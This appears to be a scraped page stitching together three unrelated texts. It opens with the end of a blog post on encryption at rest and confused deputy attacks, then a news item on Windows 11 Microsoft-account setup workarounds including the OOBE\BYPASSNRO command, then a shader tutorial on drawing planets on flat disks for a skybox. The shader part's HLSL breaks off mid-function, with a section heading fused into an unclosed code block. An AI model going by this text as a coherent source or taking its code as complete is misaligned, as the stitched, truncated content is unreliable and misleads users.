<p>Given the prevalence of client-side encryption projects that just phone it in with insecure block cipher modes (or <a href="https://fosstodon.org/@atoponce/112550648928122217">ECB, which is the absence of a block cipher mode entirely</a>), it’s highly doubtful that most of them will ever address confused deputy attacks. Even I didn’t get it right at first when I made CipherSweet back in 2018.</p>



<h3>What about non-databases?</h3>



<p>Everything I mentioned in the previous section was focused on confused deputy attacks against client-side encryption for information that is stored in a database, but it’s a general problem with encrypting data at rest and storing the ciphertext “server-side”.</p>



<p>If you’re storing encrypted data in an S3 bucket, rather than in MySQL, you still need some form of context-binding mechanism to prevent the dumb and obvious attack from working against a deputy that reads data from said S3 bucket.</p>



<p>If you take nothing else away from this blog post, remember: <em>Authenticate your access patterns</em>.</p>



<h2>Why aren’t things better already?</h2>



<p>As with most things in software security, the problem is either not widely known, or is not widely understood.</p>



<p>Unknown unknowns tend to fester, untreated, across the entire ecosystem.</p>



<p>Misunderstood issues often lead to an incorrect solution.</p>



<p>In this case, at-rest encryption is mostly in Column B, and confused deputy attacks are mostly in Column A.</p>



<p>The most pronounced consequence of this is, when tasked with building at-rest data encryption in an application, most software developers do not have a cohesive threat model in mind (let alone a formal one).</p>



<p>This leads to disagreement between stakeholders about what the security requirements actually are.</p>



<h3>How can I help improve things somewhat?</h3>



<p>Most importantly, spread awareness of the nuances of encryption at-rest.</p>



<p>This blog post is intended to be a good conversation starter, but there are other resources to consider, too. I’ve linked to many of them throughout this post already.</p>



<p>If you’re paying for software to encrypt data at rest, ask your vendor how they mitigate the risk of confused deputy attacks. Link them to this blog post if they’re not sure what you mean.</p>



<p>If said vendor responds, “this risk is outside of our threat model,” ask to see their formal threat model document. If it exists and doesn’t align with your application’s threat model, maybe consider alternative solutions that provide protection against more attack classes than Full Disk Encryption would.</p>



<p>Finally, gaining experience with <a href="https://www.trailofbits.com/services/software-assurance/appsec/" target="_blank" rel="noreferrer noopener">threat modeling</a> is a good use of every developer’s time. Adam Caudill has <a href="https://adamcaudill.com/2016/07/20/threat-modeling-for-applications/">an excellent introductory blog post on the subject</a>.</p>



<h2>Closing Thoughts</h2>



<p>Despite everything I’ve written here today, I do not claim to have all the answers for encryption at rest.</p>



<p>However, you can unlock a lot of value just by asking the right questions. My hope is that anyone that reads this post is now capable of asking those questions.</p>



<h3 id="addendum-2024-06-03">Addendum (2024-06-03)</h3>



<p>After I published this, the r/netsec subreddit has expressed disappointment that this blog post had “no mention of” consumer device theft or countries experiencing civil unrest and pulling hard drives from data centers.</p>



<p>You could make a congruent  complaint that it also had no mention of Batman.</p>



<p>To be clear, I’m <strong>not</strong> saying that the use cases and risks Reddit cares about are off-topic to any discussion of full-disk encryption. They matter.</p>



<p>Rather, it’s that they’re not relevant to <em>the specific point I am making</em>: Even in the simplest use case, far from the annoying details of end user hardware or the whims of nation states, encryption-at-rest is poorly understood by most developers, and should be thought through carefully.</p>



<p>Your threat model is not my threat model, and vice versa.</p>



<p>I never advertised this blog post as a comprehensive and complete guide to the entire subject of encryption-at-rest. If you too felt under-served by this blog post for not addressing the corner cases that really matter to <em>you</em>, I hope this addendum makes it clearer why I didn’t cover them.</p>



<p>Finally, if you feel that there’s an aspect of the encryption-at-rest topic that really warrants further examination, I invite you to blog about it. </p>



<p>If your blog post is interesting enough, I’ll revise this post and link to it here.</p>

<p>Before PC users can enjoy everything Windows 11 has on tap, they must first enter an e-mail address that’s linked to a Microsoft account. If you don’t have one, you’ll be asked to create one before you can start setting it up.</p>



<p>A frequently used trick to circumvent this block is a small but ingenious step. By entering a random e-mail address and password, which doesn’t exist and causes the link to fail, you end up directly with the creation of a local account and can thus avoid creating an official account with Microsoft.</p>



		

		


<p>Many users prefer this method, as a local account promises more control over their own data and more privacy. However, without a Microsoft account, some useful functions are also lost such as account backup or special features for apps like Copilot.</p>



<p>This common method no longer seems to work, as Microsoft has apparently patched this bug. Instead of skipping the account link, you’re led into a kind of continuous loop that doesn’t end until you have entered the correct email address.</p>

<p>Previously, it was possible to cut the Internet connection in the Task Manager before creating an account. Microsoft has since removed this workaround. As a result, many people who previously used this method are now forced to enter a working Microsoft account email address and password or use other methods.</p>



<h2 id="bypassing-microsoft-account-restrictions">Bypassing Microsoft account restrictions</h2>



<p>Another method of bypassing the account lockdown still exists. You simply have to enter OOBE\BYPASSNRO in the command prompt during the Windows 11 setup process, which allows you to skip the connection to the Internet and thus also the link to a Microsoft account. </p>



<p>However, it’s questionable how long this option will remain available. It seems that Microsoft is aiming to make the use of Windows 11 dependent on a Microsoft account. In combination with the increased calls for Windows users to finally switch to Windows 11, this appears to be a controversial combination.</p>

                            <p><h2>Flat Planets</h2></p>
                            
<p>I often envy those who can accurately estimate the time their tasks will take, particularly the seemingly small ones. Experience has taught me that it’s these ‘simple’ tasks that are often the most deceptive. What appears to be a 15-minute fix can unexpectedly turn into a bizarre edge case, transforming a supposed one-line code change into a day-long hunt for answers on the Wayback Machine. And yet, even with all that experience, the task that led me down the deepest rabbit hole, surprisingly, was texturing a sphere.</p>







<h2>Skybox</h2>



<p>Sky can serve as an excellent narrative device. Movie directors and game developers understand this well, often using it for exposition. What better way to convey the sense of being on a far-off planet than by presenting an alien sky, complete with unfamiliar-looking moons and planets hanging over the horizon?</p>

<p>I’m taking a similar approach in my project. The skybox I’m working on will feature an animated moon and a gas giant, adding some extra visual flair.</p>



<figure data-wp-context="{&quot;uploadedSrc&quot;:&quot;https:\/\/emildziewanowski.com\/wp-content\/uploads\/2024\/02\/SkyboxConcept.jpg&quot;,&quot;figureClassNames&quot;:&quot;wp-block-image size-large&quot;,&quot;figureStyles&quot;:null,&quot;imgClassNames&quot;:&quot;wp-image-381&quot;,&quot;imgStyles&quot;:null,&quot;targetWidth&quot;:2560,&quot;targetHeight&quot;:1400,&quot;scaleAttr&quot;:false,&quot;ariaLabel&quot;:&quot;Enlarge image: Skybox concepts&quot;,&quot;alt&quot;:&quot;Skybox concepts&quot;}" data-wp-interactive="core/image"><img decoding="async" width="1024" height="560" data-wp-init="callbacks.setButtonStyles" data-wp-on--click="actions.showLightbox" data-wp-on--load="callbacks.setButtonStyles" data-wp-on-window--resize="callbacks.setButtonStyles" src="https://emildziewanowski.com/wp-content/uploads/2024/02/SkyboxConcept-1024x560.jpg" alt="Skybox concepts" srcset="https://emildziewanowski.com/wp-content/uploads/2024/02/SkyboxConcept-1024x560.jpg 1024w, https://emildziewanowski.com/wp-content/uploads/2024/02/SkyboxConcept-300x164.jpg 300w, https://emildziewanowski.com/wp-content/uploads/2024/02/SkyboxConcept-768x420.jpg 768w, https://emildziewanowski.com/wp-content/uploads/2024/02/SkyboxConcept-1536x840.jpg 1536w, https://emildziewanowski.com/wp-content/uploads/2024/02/SkyboxConcept-2048x1120.jpg 2048w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>Both planets will spin, and in addition, the gas giant will feature moving atmospheric currents. Normally, these motions are too subtle to be seen, but I’ll accelerate them for greater visual impact. As for the artistic direction, I’m going for a semi-realistic style, inspired by the sci-fi art of the ’70s and ’80s.</p>



<figure data-wp-context="{&quot;uploadedSrc&quot;:&quot;https:\/\/emildziewanowski.com\/wp-content\/uploads\/2024\/02\/70SciFiArt.jpg&quot;,&quot;figureClassNames&quot;:&quot;wp-block-image size-large&quot;,&quot;figureStyles&quot;:null,&quot;imgClassNames&quot;:&quot;wp-image-233&quot;,&quot;imgStyles&quot;:null,&quot;targetWidth&quot;:2560,&quot;targetHeight&quot;:1440,&quot;scaleAttr&quot;:false,&quot;ariaLabel&quot;:&quot;Enlarge image: Style inspiration&quot;,&quot;alt&quot;:&quot;Style inspiration&quot;}" data-wp-interactive="core/image"><img decoding="async" width="1024" height="576" data-wp-init="callbacks.setButtonStyles" data-wp-on--click="actions.showLightbox" data-wp-on--load="callbacks.setButtonStyles" data-wp-on-window--resize="callbacks.setButtonStyles" src="https://emildziewanowski.com/wp-content/uploads/2024/02/70SciFiArt-1024x576.jpg" alt="Style inspiration" srcset="https://emildziewanowski.com/wp-content/uploads/2024/02/70SciFiArt-1024x576.jpg 1024w, https://emildziewanowski.com/wp-content/uploads/2024/02/70SciFiArt-300x169.jpg 300w, https://emildziewanowski.com/wp-content/uploads/2024/02/70SciFiArt-768x432.jpg 768w, https://emildziewanowski.com/wp-content/uploads/2024/02/70SciFiArt-1536x864.jpg 1536w, https://emildziewanowski.com/wp-content/uploads/2024/02/70SciFiArt-2048x1152.jpg 2048w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<h2>Planet’s Surface</h2>



<p>While the gas giant’s surface texture will be generated in realtime using a pixel shader and a render-to-texture approach, moon texture will be created using Substance Designer. This allows for experimenting with various looks by simply changing the color palette and material seed.</p>



<figure data-wp-context="{&quot;uploadedSrc&quot;:&quot;https:\/\/emildziewanowski.com\/wp-content\/uploads\/2024\/02\/SubstanceWorkflow.jpg&quot;,&quot;figureClassNames&quot;:&quot;wp-block-image size-large&quot;,&quot;figureStyles&quot;:null,&quot;imgClassNames&quot;:&quot;wp-image-252&quot;,&quot;imgStyles&quot;:null,&quot;targetWidth&quot;:2560,&quot;targetHeight&quot;:1440,&quot;scaleAttr&quot;:false,&quot;ariaLabel&quot;:&quot;Enlarge image: Substance Designer generated planets&quot;,&quot;alt&quot;:&quot;Substance Designer generated planets&quot;}" data-wp-interactive="core/image"><img loading="lazy" decoding="async" width="1024" height="576" data-wp-init="callbacks.setButtonStyles" data-wp-on--click="actions.showLightbox" data-wp-on--load="callbacks.setButtonStyles" data-wp-on-window--resize="callbacks.setButtonStyles" src="https://emildziewanowski.com/wp-content/uploads/2024/02/SubstanceWorkflow-1024x576.jpg" alt="Substance Designer generated planets" srcset="https://emildziewanowski.com/wp-content/uploads/2024/02/SubstanceWorkflow-1024x576.jpg 1024w, https://emildziewanowski.com/wp-content/uploads/2024/02/SubstanceWorkflow-300x169.jpg 300w, https://emildziewanowski.com/wp-content/uploads/2024/02/SubstanceWorkflow-768x432.jpg 768w, https://emildziewanowski.com/wp-content/uploads/2024/02/SubstanceWorkflow-1536x864.jpg 1536w, https://emildziewanowski.com/wp-content/uploads/2024/02/SubstanceWorkflow-2048x1152.jpg 2048w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>Animated gas giant, while visually captivating, presents its own set of challenges. Rendering texture for each frame will impact performance, with the rendering cost quadrupling if the texture resolution is doubled.</p>







<p>I want one solution that works consistently, regardless of whether the input is a static texture created in Substance Designer or dynamically rendered in Unreal as described in <a href="https://emildziewanowski.com/flowfields/" data-type="post" data-id="119">Flowfields.</a></p>



<figure data-wp-context="{&quot;uploadedSrc&quot;:&quot;https:\/\/emildziewanowski.com\/wp-content\/uploads\/2024\/03\/GasGiantvsMoonTex-1.jpg&quot;,&quot;figureClassNames&quot;:&quot;wp-block-image size-large&quot;,&quot;figureStyles&quot;:null,&quot;imgClassNames&quot;:&quot;wp-image-750&quot;,&quot;imgStyles&quot;:null,&quot;targetWidth&quot;:2560,&quot;targetHeight&quot;:1440,&quot;scaleAttr&quot;:false,&quot;ariaLabel&quot;:&quot;Enlarge image: Generated vs static textures&quot;,&quot;alt&quot;:&quot;Generated vs static textures&quot;}" data-wp-interactive="core/image"><img loading="lazy" decoding="async" width="1024" height="576" data-wp-init="callbacks.setButtonStyles" data-wp-on--click="actions.showLightbox" data-wp-on--load="callbacks.setButtonStyles" data-wp-on-window--resize="callbacks.setButtonStyles" src="https://emildziewanowski.com/wp-content/uploads/2024/03/GasGiantvsMoonTex-1-1024x576.jpg" alt="Generated vs static textures" srcset="https://emildziewanowski.com/wp-content/uploads/2024/03/GasGiantvsMoonTex-1-1024x576.jpg 1024w, https://emildziewanowski.com/wp-content/uploads/2024/03/GasGiantvsMoonTex-1-300x169.jpg 300w, https://emildziewanowski.com/wp-content/uploads/2024/03/GasGiantvsMoonTex-1-768x432.jpg 768w, https://emildziewanowski.com/wp-content/uploads/2024/03/GasGiantvsMoonTex-1-1536x864.jpg 1536w, https://emildziewanowski.com/wp-content/uploads/2024/03/GasGiantvsMoonTex-1-2048x1152.jpg 2048w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>This leaves 2 options for storing the planet surface – a square or rectangular texture. Although a cubemap was considered initially, its potential performance impact – consuming six times the resources of its square texture counterpart – makes it completely impractical. Furthermore, Substance Designer doesn’t support cubemap generation.</p>



<h2>UV Sphere Problems</h2>



<p>With texture choices narrowed down to square or rectangle, the next step is mapping them onto a sphere. The UV sphere is an obvious choice here, as it is easy to align its texture coordinates with the a 2×1 rectangular texture.</p>

<p> Given that only one side of the sphere is visible at a time, there is no need to use a full, unique rectangular texture,  a tiling square one can be used instead.</p>

<h3>Jagged Edges</h3>



<p>Using UV sphere might be the easiest option, but unfortunately in this case is not the best one. Firstly the outline is visibly angular – it doesn’t have to be a perfect circle, but at least should be smooth.</p>



<figure data-wp-context="{&quot;uploadedSrc&quot;:&quot;https:\/\/emildziewanowski.com\/wp-content\/uploads\/2024\/02\/JaggedEdges.jpg&quot;,&quot;figureClassNames&quot;:&quot;wp-block-image size-large&quot;,&quot;figureStyles&quot;:null,&quot;imgClassNames&quot;:&quot;wp-image-264&quot;,&quot;imgStyles&quot;:null,&quot;targetWidth&quot;:2560,&quot;targetHeight&quot;:1440,&quot;scaleAttr&quot;:false,&quot;ariaLabel&quot;:&quot;Enlarge image: Polycount an jagged edges&quot;,&quot;alt&quot;:&quot;Polycount an jagged edges&quot;}" data-wp-interactive="core/image"><img loading="lazy" decoding="async" width="1024" height="576" data-wp-init="callbacks.setButtonStyles" data-wp-on--click="actions.showLightbox" data-wp-on--load="callbacks.setButtonStyles" data-wp-on-window--resize="callbacks.setButtonStyles" src="https://emildziewanowski.com/wp-content/uploads/2024/02/JaggedEdges-1024x576.jpg" alt="Polycount an jagged edges" srcset="https://emildziewanowski.com/wp-content/uploads/2024/02/JaggedEdges-1024x576.jpg 1024w, https://emildziewanowski.com/wp-content/uploads/2024/02/JaggedEdges-300x169.jpg 300w, https://emildziewanowski.com/wp-content/uploads/2024/02/JaggedEdges-768x432.jpg 768w, https://emildziewanowski.com/wp-content/uploads/2024/02/JaggedEdges-1536x864.jpg 1536w, https://emildziewanowski.com/wp-content/uploads/2024/02/JaggedEdges-2048x1152.jpg 2048w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>When triangle count is not an issue this problem can be solved by using a sphere with more subdivisions. Alternatively the edge can be masked using pixel shader.</p>



<h2>Texture Usage</h2>



<p>Most of the sphere’s surface is viewed at an angle, leading to sampling from lower mipmaps. This is particularly problematic for dynamic textures, where each pixel is rendered per frame. Most of the generated image gets wasted on areas where it is barely visible.</p>



<figure data-wp-context="{&quot;uploadedSrc&quot;:&quot;https:\/\/emildziewanowski.com\/wp-content\/uploads\/2024\/02\/InefficientTextureUsage-1.jpg&quot;,&quot;figureClassNames&quot;:&quot;wp-block-image size-large&quot;,&quot;figureStyles&quot;:null,&quot;imgClassNames&quot;:&quot;wp-image-269&quot;,&quot;imgStyles&quot;:null,&quot;targetWidth&quot;:2560,&quot;targetHeight&quot;:1440,&quot;scaleAttr&quot;:false,&quot;ariaLabel&quot;:&quot;Enlarge image: Poor texture usage&quot;,&quot;alt&quot;:&quot;Poor texture usage&quot;}" data-wp-interactive="core/image"><img loading="lazy" decoding="async" width="1024" height="576" data-wp-init="callbacks.setButtonStyles" data-wp-on--click="actions.showLightbox" data-wp-on--load="callbacks.setButtonStyles" data-wp-on-window--resize="callbacks.setButtonStyles" src="https://emildziewanowski.com/wp-content/uploads/2024/02/InefficientTextureUsage-1-1024x576.jpg" alt="Poor texture usage" srcset="https://emildziewanowski.com/wp-content/uploads/2024/02/InefficientTextureUsage-1-1024x576.jpg 1024w, https://emildziewanowski.com/wp-content/uploads/2024/02/InefficientTextureUsage-1-300x169.jpg 300w, https://emildziewanowski.com/wp-content/uploads/2024/02/InefficientTextureUsage-1-768x432.jpg 768w, https://emildziewanowski.com/wp-content/uploads/2024/02/InefficientTextureUsage-1-1536x864.jpg 1536w, https://emildziewanowski.com/wp-content/uploads/2024/02/InefficientTextureUsage-1-2048x1152.jpg 2048w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p> While increasing tiling can mitigate this issue, it introduces another problem.</p>



<h3>Seams</h3>



<p>To maintain a continuous pattern across the whole sphere, the tiling can only be increased in whole numbers. However, even doubling the initial tiling makes the repetition noticeable. </p>



<figure data-wp-context="{&quot;uploadedSrc&quot;:&quot;https:\/\/emildziewanowski.com\/wp-content\/uploads\/2024\/02\/VisibleSeam-1.jpg&quot;,&quot;figureClassNames&quot;:&quot;wp-block-image size-large&quot;,&quot;figureStyles&quot;:null,&quot;imgClassNames&quot;:&quot;wp-image-280&quot;,&quot;imgStyles&quot;:null,&quot;targetWidth&quot;:2560,&quot;targetHeight&quot;:1440,&quot;scaleAttr&quot;:false,&quot;ariaLabel&quot;:&quot;Enlarge image: Seam and tiling&quot;,&quot;alt&quot;:&quot;Seam and tiling&quot;}" data-wp-interactive="core/image"><img loading="lazy" decoding="async" width="1024" height="576" data-wp-init="callbacks.setButtonStyles" data-wp-on--click="actions.showLightbox" data-wp-on--load="callbacks.setButtonStyles" data-wp-on-window--resize="callbacks.setButtonStyles" src="https://emildziewanowski.com/wp-content/uploads/2024/02/VisibleSeam-1-1024x576.jpg" alt="Seam and tiling" srcset="https://emildziewanowski.com/wp-content/uploads/2024/02/VisibleSeam-1-1024x576.jpg 1024w, https://emildziewanowski.com/wp-content/uploads/2024/02/VisibleSeam-1-300x169.jpg 300w, https://emildziewanowski.com/wp-content/uploads/2024/02/VisibleSeam-1-768x432.jpg 768w, https://emildziewanowski.com/wp-content/uploads/2024/02/VisibleSeam-1-1536x864.jpg 1536w, https://emildziewanowski.com/wp-content/uploads/2024/02/VisibleSeam-1-2048x1152.jpg 2048w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>Fractional values, on the other hand, create a seam running from the north to the south pole.</p>



<h3>Polar Distortion</h3>



<p>Another problem is texture pinching at the poles. Not only the pinching is visually jarring, mapping onto triangles generates additional distortion, similiar to PSX’s ‘floaty’ texturing. </p>



<figure data-wp-context="{&quot;uploadedSrc&quot;:&quot;https:\/\/emildziewanowski.com\/wp-content\/uploads\/2024\/02\/PolePinching-1.jpg&quot;,&quot;figureClassNames&quot;:&quot;wp-block-image size-large&quot;,&quot;figureStyles&quot;:null,&quot;imgClassNames&quot;:&quot;wp-image-282&quot;,&quot;imgStyles&quot;:null,&quot;targetWidth&quot;:2560,&quot;targetHeight&quot;:1440,&quot;scaleAttr&quot;:false,&quot;ariaLabel&quot;:&quot;Enlarge image: With and without polar patch&quot;,&quot;alt&quot;:&quot;With and without polar patch&quot;}" data-wp-interactive="core/image"><img loading="lazy" decoding="async" width="1024" height="576" data-wp-init="callbacks.setButtonStyles" data-wp-on--click="actions.showLightbox" data-wp-on--load="callbacks.setButtonStyles" data-wp-on-window--resize="callbacks.setButtonStyles" src="https://emildziewanowski.com/wp-content/uploads/2024/02/PolePinching-1-1024x576.jpg" alt="With and without polar patch" srcset="https://emildziewanowski.com/wp-content/uploads/2024/02/PolePinching-1-1024x576.jpg 1024w, https://emildziewanowski.com/wp-content/uploads/2024/02/PolePinching-1-300x169.jpg 300w, https://emildziewanowski.com/wp-content/uploads/2024/02/PolePinching-1-768x432.jpg 768w, https://emildziewanowski.com/wp-content/uploads/2024/02/PolePinching-1-1536x864.jpg 1536w, https://emildziewanowski.com/wp-content/uploads/2024/02/PolePinching-1-2048x1152.jpg 2048w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>A common workaround in game development has been to conceal these pinched areas with a textured patch.</p>



<h3>Atmosphere</h3>



<p>Finally, when considering the UV sphere for a planetary model, the inability to depict atmospheric halos becomes a limitation. Since mesh only allows surface drawing, an additional model is required for the halo, complicating the setup.</p>



<figure data-wp-context="{&quot;uploadedSrc&quot;:&quot;https:\/\/emildziewanowski.com\/wp-content\/uploads\/2024\/02\/HaloMeshes-1.jpg&quot;,&quot;figureClassNames&quot;:&quot;wp-block-image size-large&quot;,&quot;figureStyles&quot;:null,&quot;imgClassNames&quot;:&quot;wp-image-278&quot;,&quot;imgStyles&quot;:null,&quot;targetWidth&quot;:2560,&quot;targetHeight&quot;:1440,&quot;scaleAttr&quot;:false,&quot;ariaLabel&quot;:&quot;Enlarge image: Ways of adding atmosphere&quot;,&quot;alt&quot;:&quot;Ways of adding atmosphere&quot;}" data-wp-interactive="core/image"><img loading="lazy" decoding="async" width="1024" height="576" data-wp-init="callbacks.setButtonStyles" data-wp-on--click="actions.showLightbox" data-wp-on--load="callbacks.setButtonStyles" data-wp-on-window--resize="callbacks.setButtonStyles" src="https://emildziewanowski.com/wp-content/uploads/2024/02/HaloMeshes-1-1024x576.jpg" alt="Ways of adding atmosphere" srcset="https://emildziewanowski.com/wp-content/uploads/2024/02/HaloMeshes-1-1024x576.jpg 1024w, https://emildziewanowski.com/wp-content/uploads/2024/02/HaloMeshes-1-300x169.jpg 300w, https://emildziewanowski.com/wp-content/uploads/2024/02/HaloMeshes-1-768x432.jpg 768w, https://emildziewanowski.com/wp-content/uploads/2024/02/HaloMeshes-1-1536x864.jpg 1536w, https://emildziewanowski.com/wp-content/uploads/2024/02/HaloMeshes-1-2048x1152.jpg 2048w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>The UV sphere may seem as a feasible solution, but the laundry list of necessary modifications and creative hacks turns it into a Frankenstein’s monster. It is still used for modeling a planet, but for my application, the skybox, I was considering another option.</p>



<h2>Flat Disk</h2>



<p>Opting for an actual spherical mesh to represent the planet is primarily for the ease of texture mapping. In the case of a skybox, however, there’s no need for a complex 3D mesh – it will be observed from a distance and from one position. A basic disk will work just as good. The main issue, texture mapping, can be effectively managed through a pixel shader. This technique also has the added benefit of allowing the atmospheric halo to be drawn on the same mesh.</p>



<figure data-wp-context="{&quot;uploadedSrc&quot;:&quot;https:\/\/emildziewanowski.com\/wp-content\/uploads\/2024\/02\/FlatDiskVsSphere.jpg&quot;,&quot;figureClassNames&quot;:&quot;wp-block-image size-large&quot;,&quot;figureStyles&quot;:null,&quot;imgClassNames&quot;:&quot;wp-image-285&quot;,&quot;imgStyles&quot;:null,&quot;targetWidth&quot;:2560,&quot;targetHeight&quot;:1440,&quot;scaleAttr&quot;:false,&quot;ariaLabel&quot;:&quot;Enlarge image: Using flat disk vs using 3D sphere&quot;,&quot;alt&quot;:&quot;Using flat disk vs using 3D sphere&quot;}" data-wp-interactive="core/image"><img loading="lazy" decoding="async" width="1024" height="576" data-wp-init="callbacks.setButtonStyles" data-wp-on--click="actions.showLightbox" data-wp-on--load="callbacks.setButtonStyles" data-wp-on-window--resize="callbacks.setButtonStyles" src="https://emildziewanowski.com/wp-content/uploads/2024/02/FlatDiskVsSphere-1024x576.jpg" alt="Using flat disk vs using 3D sphere" srcset="https://emildziewanowski.com/wp-content/uploads/2024/02/FlatDiskVsSphere-1024x576.jpg 1024w, https://emildziewanowski.com/wp-content/uploads/2024/02/FlatDiskVsSphere-300x169.jpg 300w, https://emildziewanowski.com/wp-content/uploads/2024/02/FlatDiskVsSphere-768x432.jpg 768w, https://emildziewanowski.com/wp-content/uploads/2024/02/FlatDiskVsSphere-1536x864.jpg 1536w, https://emildziewanowski.com/wp-content/uploads/2024/02/FlatDiskVsSphere-2048x1152.jpg 2048w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>The disk mesh I’ll use is a straightforward filled circular polygon. The key feature to note is that its texture coordinates have their origin exactly at the center of the disk. If we assume that the planet has a radius of 1, then the UV coordinates have to extend beyond that to make some space for rendering the atmosphere.</p>



<figure data-wp-context="{&quot;uploadedSrc&quot;:&quot;https:\/\/emildziewanowski.com\/wp-content\/uploads\/2024\/01\/PolygonalDiscCoords.jpg&quot;,&quot;figureClassNames&quot;:&quot;wp-block-image size-large&quot;,&quot;figureStyles&quot;:null,&quot;imgClassNames&quot;:&quot;wp-image-204&quot;,&quot;imgStyles&quot;:null,&quot;targetWidth&quot;:2560,&quot;targetHeight&quot;:1440,&quot;scaleAttr&quot;:false,&quot;ariaLabel&quot;:&quot;Enlarge image: Flat disk UV coordinates&quot;,&quot;alt&quot;:&quot;Flat disk UV coordinates&quot;}" data-wp-interactive="core/image"><img loading="lazy" decoding="async" width="1024" height="576" data-wp-init="callbacks.setButtonStyles" data-wp-on--click="actions.showLightbox" data-wp-on--load="callbacks.setButtonStyles" data-wp-on-window--resize="callbacks.setButtonStyles" src="https://emildziewanowski.com/wp-content/uploads/2024/01/PolygonalDiscCoords-1024x576.jpg" alt="Flat disk UV coordinates" srcset="https://emildziewanowski.com/wp-content/uploads/2024/01/PolygonalDiscCoords-1024x576.jpg 1024w, https://emildziewanowski.com/wp-content/uploads/2024/01/PolygonalDiscCoords-300x169.jpg 300w, https://emildziewanowski.com/wp-content/uploads/2024/01/PolygonalDiscCoords-768x432.jpg 768w, https://emildziewanowski.com/wp-content/uploads/2024/01/PolygonalDiscCoords-1536x864.jpg 1536w, https://emildziewanowski.com/wp-content/uploads/2024/01/PolygonalDiscCoords-2048x1152.jpg 2048w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<h2>Pixel Shader</h2>



<p>There are several features of the 3D UV Sphere mesh I want to recreate in the shader. Obviously, the shader version of a planet has to be visually indistinguishable from the mesh one. It also has to be free of all the problems of the mesh listed before. The shader creation process will be broken down to several steps.</p>



<ul>
<li>Surface Equation: Without the triangle mesh, the surface has to be defined in analytical terms.</li>



<li>Texture Mapping: UV coordinates have to be defined as a function of position on a sphere. This includes scaling and TBN calculation</li>



<li>Orientation: The shader must allow for the tilting of the planet’s axis.</li>



<li>Rotation: The planet should be able to spin around its axis.</li>
</ul>



<h2>Surface Equation</h2>



<p>One important note on coordinates: I’ll be using a left-handed, Y-up system, as it is most consistent with DirectX. I will also use the DirectX normal map format. While Unreal Engine also uses a left-handed system,  Z is the up-direction. It is a good practice to double- or triple-check orientations and the format of normal maps used.</p>



<p>The surface equation maps a 2D position on a disc plane to a corresponding 3D position on a spherical surface. In simpler terms – it is a function that draws a ball.</p>

<p>The first step is figuring out if the pixel lies on the surface of a sphere. To create a bounding circle mask, verify if the length of the UV vector is less than the sphere’s radius:</p>



<figure data-wp-context="{&quot;uploadedSrc&quot;:&quot;https:\/\/emildziewanowski.com\/wp-content\/uploads\/2024\/02\/CircleMaskEquation-2.jpg&quot;,&quot;figureClassNames&quot;:&quot;wp-block-image size-large&quot;,&quot;figureStyles&quot;:null,&quot;imgClassNames&quot;:&quot;wp-image-249&quot;,&quot;imgStyles&quot;:null,&quot;targetWidth&quot;:2560,&quot;targetHeight&quot;:1440,&quot;scaleAttr&quot;:false,&quot;ariaLabel&quot;:&quot;Enlarge image: Circle equation&quot;,&quot;alt&quot;:&quot;Circle equation&quot;}" data-wp-interactive="core/image"><img loading="lazy" decoding="async" width="1024" height="576" data-wp-init="callbacks.setButtonStyles" data-wp-on--click="actions.showLightbox" data-wp-on--load="callbacks.setButtonStyles" data-wp-on-window--resize="callbacks.setButtonStyles" src="https://emildziewanowski.com/wp-content/uploads/2024/02/CircleMaskEquation-2-1024x576.jpg" alt="Circle equation" srcset="https://emildziewanowski.com/wp-content/uploads/2024/02/CircleMaskEquation-2-1024x576.jpg 1024w, https://emildziewanowski.com/wp-content/uploads/2024/02/CircleMaskEquation-2-300x169.jpg 300w, https://emildziewanowski.com/wp-content/uploads/2024/02/CircleMaskEquation-2-768x432.jpg 768w, https://emildziewanowski.com/wp-content/uploads/2024/02/CircleMaskEquation-2-1536x864.jpg 1536w, https://emildziewanowski.com/wp-content/uploads/2024/02/CircleMaskEquation-2-2048x1152.jpg 2048w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<div><pre data-lang="HLSL"><code>float CircleMask( float2 uv, float radius)
{
    return length(uv) &lt; radius? 1.0: 0.0;
}</code></pre></div>



<p>It’s important to note that this approach will function correctly only when the UV coordinates are aligned with the center of the mesh.</p>



<p>Next step is to create surface vector – or the local position of the surface of the sphere. Luckily both x and y components of the UV coordinates are the same as the corresponding surface vector components. The only thing left to do is to reconstruct z component. </p>

<div><pre data-lang="HLSL"><code>float3 ReconstructSurface(float2 uv)

<h2>Texture Mapping</h2>



<p>Mapping the square texture to spherical surface can be broken down to 3 operations:</p>



<ol>
<li>Wrapping around cylinder</li>



<li>Repeating the same for y axis</li>



<li>Deforming the result into a circle</li>
</ol>







<p>Process of wrapping might seem counterintuitive. The x coordinate of texture will be proportional to the angle the texture would wrap around the cylinder. To find this angle it is enough to calculate the arcsine(x). Then the angle has to be remapped from [-<strong>π</strong>, <strong>π </strong>] to [0, 1]. </p>



<p>To form a circle it is necessary to define the circular curve as a distance from y axis:</p>



